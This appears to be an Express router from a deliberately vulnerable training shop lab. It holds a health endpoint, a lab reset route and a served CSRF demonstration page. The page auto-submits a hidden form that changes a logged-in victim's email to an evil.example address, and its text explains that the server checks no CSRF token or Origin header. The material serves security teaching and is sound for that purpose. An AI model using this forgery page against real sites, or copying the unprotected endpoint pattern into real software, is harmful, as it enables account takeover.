/*
 * 星澜优选 lab operations: health probe, runtime reset and the CSRF demo page.
 */
import { Router } from 'express'
import fs from 'node:fs'
import path from 'node:path'
import { ProductModel } from '../models/product'
import { sequelize } from '../models/index'
import * as security from '../lib/insecurity'
import { labState, resetRuntime, runtimeFilePath, SEED_VERSION } from '../data/labRuntime'
import { resetStellarPickState } from './stellarpick'

const router = Router()

function dbFile (): string {
  const storage = String((sequelize as any)?.options?.storage ?? 'data/juiceshop.sqlite')
  return path.isAbsolute(storage) ? storage : path.resolve(storage)
}

function fileInfo (file: string): { path: string, exists: boolean, sizeBytes: number } {
  try {
    const stat = fs.statSync(file)
    return { path: file, exists: true, sizeBytes: stat.size }
  } catch (err) {
    return { path: file, exists: false, sizeBytes: 0 }
  }
}

function clearUploads (): number {
  const dir = path.resolve('uploads')
  if (!fs.existsSync(dir)) return 0
  let removed = 0
  for (const entry of fs.readdirSync(dir)) {
    try {
      fs.rmSync(path.join(dir, entry), { recursive: true, force: true })
      removed++
    } catch (err) { /* keep going, a locked file must not abort the reset */ }
  }
  return removed
}

// GET /healthz - public, no authentication required.
export function healthz () {
  return async (_req: any, res: any): Promise<void> => {
    let visible = 0
    let total = 0
    let dbOk = true
    try {
      visible = await ProductModel.count()
      total = await ProductModel.count({ paranoid: false })
    } catch (err) {
      dbOk = false
    }
    const carts = Object.keys(labState.carts).filter((key) => (labState.carts[key] ?? []).length > 0).length
    res.status(dbOk ? 200 : 503).json({
      ok: dbOk,
      seedVersion: SEED_VERSION,
      uptime: Math.round(process.uptime() * 1000) / 1000,
      time: new Date().toISOString(),
      db: { ...fileInfo(dbFile()), ok: dbOk },
      products: { visible, total, hidden: Math.max(0, total - visible) },
      orders: { count: labState.orders.length },
      carts: { active: carts },
      tickets: { count: labState.tickets.length },
      runtime: fileInfo(runtimeFilePath())
    })
  }
}

// POST /lab/reset?confirm=1 - reset lab runtime state and uploads.
// The SQLite seed itself is rebuilt by datacreator on the next process start.
router.post('/reset', (req, res) => {
  if (String(req.query.confirm ?? '') !== '1') {
    res.status(400).json({ ok: false, code: 'CONFIRM_REQUIRED', message: '请使用 POST /lab/reset?confirm=1 确认重置' })
    return
  }
  resetRuntime()
  resetStellarPickState()
  const uploadsRemoved = clearUploads()
  security.authenticatedUsers.tokenMap = {}
  security.authenticatedUsers.idMap = {}
  res.clearCookie('sp_token', { path: '/', sameSite: 'none', secure: true })
  res.json({
    ok: true,
    resetAt: new Date().toISOString(),
    orders: labState.orders.length,
    carts: 0,
    tickets: labState.tickets.length,
    uploadsRemoved,
    db: {
      reseedRequired: true,
      note: '商品、用户与邮箱等 SQLite 数据在进程启动时由 datacreator 重建；如需恢复这些数据，请重启服务。'
    }
  })
})

const CSRF_PAGE = `<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>星澜优选 · CSRF 演示（第三方页面）</title>
<style>
  body { font-family: system-ui, "Segoe UI", "Microsoft YaHei", sans-serif; margin: 0; background: #0f172a; color: #e2e8f0; }
  main { max-width: 720px; margin: 48px auto; padding: 28px 32px; background: #1e293b; border-radius: 14px; box-shadow: 0 12px 40px rgba(0,0,0,.35); }
  h1 { font-size: 22px; margin: 0 0 8px; }
  .tag { display: inline-block; font-size: 12px; padding: 2px 10px; border-radius: 999px; background: #7f1d1d; color: #fecaca; }
  p { line-height: 1.7; color: #cbd5e1; }
  code { background: #0f172a; padding: 1px 6px; border-radius: 5px; color: #7dd3fc; }
  form { margin: 18px 0; display: flex; gap: 10px; align-items: end; flex-wrap: wrap; }
  label { display: flex; flex-direction: column; gap: 6px; font-size: 13px; color: #94a3b8; }
  input { padding: 9px 12px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: #e2e8f0; min-width: 280px; }
  button { padding: 10px 18px; border: 0; border-radius: 8px; background: #f97316; color: #fff; font-weight: 600; cursor: pointer; }
  #status { font-size: 13px; color: #fbbf24; }
</style>
</head>
<body>
<main>
  <span class="tag">第三方页面 · 不属于星澜优选</span>
  <h1>CSRF 演示：跨站修改受害者邮箱</h1>
  <p>当前页面来源：<code id="origin">?</code>；目标站点：<code>{{LOOPBACK}}</code>。</p>
  <p>当受害者已在目标站点登录（浏览器持有 <code>sp_token</code> Cookie），本页会自动提交一个普通表单到
    <code>POST /api/account/email</code>。服务端不校验 CSRF token，也不校验 Origin/Referer，因此请求被接受。</p>
  <p>提示：用 <code>{{LOCALHOST}}/lab/csrf.html</code> 打开本页即为跨站（localhost 与 127.0.0.1 是不同站点），
    用 <code>{{LOOPBACK}}/lab/csrf.html</code> 打开则是同源对照演示。加 <code>?manual=1</code> 可关闭自动提交。</p>
  <form id="csrf" method="POST" action="{{LOOPBACK}}/api/account/email" target="sink">
    <label>新邮箱<input name="email" value="csrf-victim@evil.example" autocomplete="off"></label>
    <button type="submit">提交改邮箱表单</button>
  </form>
  <iframe name="sink" id="sink" hidden></iframe>
  <p id="status">等待提交…</p>
</main>
<script>
  document.getElementById('origin').textContent = location.origin;
  var params = new URLSearchParams(location.search);
  var email = params.get('email');
  if (email) { document.querySelector('input[name=email]').value = email; }
  var status = document.getElementById('status');
  function submit () {
    status.textContent = '已提交 POST /api/account/email（Origin: ' + location.origin + '，无 CSRF token）';
    document.getElementById('csrf').submit();
  }
  if (params.get('manual') !== '1') { setTimeout(submit, 1200); }
</script>
</body>
</html>`

router.get('/reset', (_req, res) => {
  res.status(405).json({ ok: false, code: 'METHOD_NOT_ALLOWED', message: '请使用 POST /lab/reset?confirm=1' })
})

router.get('/csrf.html', (req, res) => {
  // Always target the loopback IP so opening the page via localhost stays a
  // real cross-site request (the sp_token cookie is host-only). The port comes
  // from the listening socket, never from the untrusted Host header.
  const port = String((req.socket as any)?.localPort ?? 8081)
  const page = CSRF_PAGE
    .replace(/\{\{LOCALHOST\}\}/g, `http://localhost:${port}`)
    .replace(/\{\{LOOPBACK\}\}/g, `http://127.0.0.1:${port}`)
  res.type('html').send(page)
})

router.get('/csrf', (_req, res) => {
  res.redirect('/lab/csrf.html')
})

export { router }
